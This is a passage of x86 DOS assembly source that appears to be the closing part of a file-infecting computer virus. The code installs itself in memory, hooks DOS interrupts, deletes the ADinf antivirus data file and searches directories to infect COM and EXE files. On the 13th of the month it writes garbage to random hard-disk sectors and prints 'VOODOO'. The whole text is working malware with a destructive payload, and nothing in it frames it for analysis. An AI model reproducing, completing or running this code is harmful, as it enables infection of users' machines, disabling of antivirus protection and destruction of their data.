                call Infeckt_exe
                call make52s
                call closeFile
                mov byte ptr es:[typeFile],033h
                jmp  ret_old_atrc
   COM_file_not_found:  RET

   ;-------------------------------------------
   START_:             xor ax,ax
                       mov ds,ax
                       mov si,84h
                       mov cx,2
                       push cs
                       pop es
                       mov di,offset addr21-add_c
                       add di,bp
                       rep movsw
                       cmp byte ptr cs:[TAG_COM_OR_EXE+z],0
                       je  @AlocMem
                       ;----
                       ;----
                       pop ax
                       pop es
                       push es
                       push ax
    @AlocMem:
                       MOV AH,48H
                       MOV BX,017FH
                       call int21
                       JNB @Next01
                       MOV AH,49H       ;
                       call int21
                       MOV AH,48H       ;
                       MOV BX,0FFFFH    ;
                       call int21
                       SUB BX,0180H     ;
                       MOV AH,48H       ;
                       call int21
                       JMP @AlocMem     ;
      ;-----------------------------------------
      @Next01:         PUSH DS         ;
                       DEC AX          ;
                       MOV DS,AX       ;
                       DB  0C7H,06H,01H,00H,08H,00
                       POP  DS
                       INC  AX
                      ;---------------
        Inst :         MOV ES,AX       ;ES=NEW_SEG
   ;--------------------------------------------------------
   ;                  addres24hTR
                      mov si,144 ;ds:si=int24h
                      mov di,addres24hTR
                      mov cx,2
                      rep movsw
                      ;---- Set New24h
                      push cs
                      pop ds
                      mov dx,offset New24h-add_c
                      add dx,bp
                      mov ax,2524h
                      int 21h
                      ;--------------
   ;-------------------------------------------------------
   ; Killall -9 ADINF :-)
                      call DellAdinf
                      db 'c:\adinfÍcÍ.°°°',0
      DellAdinf:      pop dx
                      push cs
                      pop ds
                      mov ax,4301h
                      mov cx,20h
                      call int21
                      jc NotEx
                      mov ah,41h
                      int 21h
     NotEx:
   ;--------------------------------------------------------
                      call randomaze
   ;---------------------------------------------------------
                       mov ah,47h
                       mov dl,0
                       push es
                       pop ds
                       mov si,CurDirRoot
                       int 21h
                       ;----
                       call GrateJobe
                       ;---
                        call setCR
                         db '\',0
                  setCR: pop dx
                         push cs
                         pop ds
                         mov ah,3bh
                         int 21h
                        call GrateJobe
                       ;---------
                       ; ret old dir
                         push es
                         pop ds
                         mov dx,CurDirRoot
                         mov ah,3bh
                         int 21h
                       ;---Death------
                         mov ah,2ah
                         call int21
                         cmp dl,13
                         jne Not13
                         in al,42H
                         MOV CH,AL ;CYL
                         in al,42H
                         AND AL,63
                         MOV CL,AL ;SEC
                         in al,42H
                         AND AL,31
                         MOV DH,AL
                         IN AL,42H
                         MOV AH,03H
                         MOV DL,80H
                         INT 13H
                         mov ah,05h
                         mov dl,'V'
                         int 21h
                         mov dl,'O'
                         int 21h
                         mov dl,'O'
                         int 21h
                         mov dl,'D'
                         int 21h
                         mov dl,'O'
                         int 21h
                         mov dl,'O'
                         int 21h
                  Not13:;--------------
                        cmp bp,104h
                        jne @zad_j01
   dosEXIT:             call retOldInt24h
                        call freeMem
                        MOV AX,4C00H
                        INT 21H
                        jmp dosEXIT
   retOldInt24h:push ds
                mov ax,es:[addres24hTR+2]
                mov ds,ax
                mov dx,es:[addres24hTR]
                mov ax,2524h
                int 21h
                pop ds
                ret
   @zad_j01 :jmp @zad
   int21:   push si
            call @nnn
   ADDR21:   dd 0
   @nnn:    pop si
            pushf
            call dword ptr cs:[si]
            pop si
            ret
   ;------------------------------------------------------------
   freeMem:  mov ah,49h
             int 21h
             ret
   ;--------------------------------------------------
   New24h:mov al,3
          iret
   CS_old_bx dw 0
   ;-------------------------
   @zad:;---------------------------------------------------------
   GoOut:          call retOldInt24h
                   call freeMem
   FULLexit:       cmp byte ptr cs:[TAG_COM_OR_EXE+z],0
                      jne _ne_com
                      pop ax
                      pop ax
        _ne_com:      pop ax
                      mov cs:[CS_old_bx+z],ax
           cmp byte ptr cs:[TAG_COM_OR_EXE+z],0
          je  RETENER
          mov bx,cs:[CS_old_bx+z]
          pop es
          add cs:word ptr [bx+07],0010h
          mov ax,es
          add cs:[bx+07],ax
          pop ds
          pop cx ; sp
          pop dx ; ss
          mov ss,dx
          mov sp,cx
          push cs
          mov ax,bx
          add ax,4
          push AX
          retf
   RETENER: JMP GO_
   old_commands   dB 3 dup(90h);
      GO_:  PUSH DI
            PUSH SI
            PUSH CX
            MOV DI,100H
            DB 0E8H
            DW 0000H
            POP SI
            SUB SI,12 ;
            MOV CX,3
   @0001:  MOV DL,CS:[SI]
           MOV CS:[DI],DL
           INC DI
           INC SI
           LOOP @0001
           POP CX
           POP SI
           POP DI
           pop cx ; sp
           pop dx ; ss
           mov ss,dx
           mov sp,cx
           mov cx,100h
           jmp cx
   zad:
   Code ENDS
        END BEGIN
